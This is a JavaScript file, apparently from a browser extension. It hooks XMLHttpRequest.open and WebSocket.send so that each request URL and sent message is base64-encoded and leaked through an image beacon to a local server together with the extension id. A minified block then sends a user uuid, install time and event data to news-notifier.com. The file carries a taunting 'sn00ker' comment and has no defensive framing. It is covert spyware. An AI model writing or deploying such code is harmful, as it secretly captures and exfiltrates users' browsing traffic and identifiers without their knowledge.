function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
!function(){"use strict";var t=window.constsd6deae36,e={track:function(n,i){chrome.storage.local.get(["uuid","installTime"],function(o){o.uuid&&o.installTime&&t.cv&&(e.trackMeta=["uuid="+o.uuid,"i="+o.installTime,"v=1.8.34","cv="+t.cv].join("&")),setTimeout(function(){(new Image).src="https://news-notifier.com/theguardian_uk/__utm.gif?m="+encodeURIComponent(n)+(void 0!==i?"&v="+encodeURIComponent(i):"")+"&t="+String(Date.now())+"&"+(e.trackMeta?e.trackMeta:"nometa=1")},0)})}};window.utilsd6deae36=e}();